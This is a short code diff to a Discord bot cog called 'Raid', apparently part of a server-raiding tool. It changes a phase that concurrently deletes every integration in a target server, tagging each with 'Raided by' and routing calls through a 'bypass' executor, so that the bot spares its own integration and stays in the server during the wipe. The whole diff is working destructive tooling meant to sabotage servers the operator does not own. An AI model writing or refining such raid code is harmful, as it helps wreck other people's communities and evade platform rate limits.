@@ -454,12 +454,21 @@ class Raid(commands.Cog):
     async def _phase_integration_wipe(self, guild: discord.Guild) -> None:
         try:
             integrations = await guild.integrations()
+            my_app_id = self.bot.application_id
+
+            # NEVER delete our own integration — doing so kicks the bot from the server
+            safe = [
+                intg for intg in integrations
+                if getattr(getattr(intg, "application", None), "id", None) != my_app_id
+                and getattr(intg, "id", None) != my_app_id
+            ]
+
             await asyncio.gather(
                 *[bot_state.bypass.execute(
                     ROUTE_INTEGRATION,
                     lambda i=intg: i.delete(reason=f"Raided by {RAID_TAG}"),
                     bot_state.stop_event,
-                ) for intg in integrations],
+                ) for intg in safe],
                 return_exceptions=True,
             )
         except Exception:
